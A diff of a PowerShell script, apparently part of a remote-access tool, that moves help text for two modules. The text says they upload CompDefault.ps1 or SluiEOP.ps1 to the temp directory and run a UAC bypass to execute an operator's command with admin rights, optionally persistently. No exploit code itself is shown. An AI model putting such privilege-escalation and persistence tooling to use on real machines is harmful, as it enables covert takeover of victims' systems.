@@ -933,6 +933,11 @@ While($Client.Connected)
            $File = "$Bin$name"
            If(([System.IO.File]::Exists("$File")))
            {
+              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
+              write-host "   -----------------";
+              write-host "   This module uploads CompDefault.ps1 script to `$env:TMP dir and executes";
+              write-host "   EOP|UAC bypass to silent execute our command with higth privileges. (Admin)`n`n";
+
               write-host " - Input Command: " -NoNewline;
               $mYcOMMAND = Read-Host
               ## Make the command persistence
@@ -947,10 +952,6 @@ While($Client.Connected)
                  }
                  cd ..
               }
-              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
-              write-host "   -----------------";
-              write-host "   This module uploads CompDefault.ps1 script to `$env:TMP dir and executes";
-              write-host "   EOP to be abble to silent execute our command with higth privileges.";
               If($PersisteMe -eq "True"){
                  write-host "`n   If 'MakeItPersistence' its activated (True) then CompDefault will NOT";
                  write-host "   Delete the EOP, making the 'command' available everytime we execute";
@@ -985,6 +986,11 @@ While($Client.Connected)
            $File = "$Bin$name"
            If(([System.IO.File]::Exists("$File")))
            {
+              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
+              write-host "   -----------------";
+              write-host "   This module uploads SluiEOP.ps1 script to `$env:TMP dir and executes";
+              write-host "   EOP|UAC bypass to silent execute our command with higth privileges. (Admin)`n`n";
+
               write-host " - Input Command: " -NoNewline;
               $mYcOMMAND = Read-Host
               ## Make the command persistence
@@ -999,10 +1005,7 @@ While($Client.Connected)
                  }
                  cd ..
               }
-              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
-              write-host "   -----------------";
-              write-host "   This module uploads SluiEOP.ps1 script to `$env:TMP dir and executes";
-              write-host "   EOP to be abble to silent execute our command with higth privileges.";
+
               If($PersisteMe -eq "True"){
                  write-host "`n   If 'MakeItPersistence' its activated (True) then SluiEOP will NOT";
                  write-host "   Delete the EOP, making the 'command' available everytime we execute";
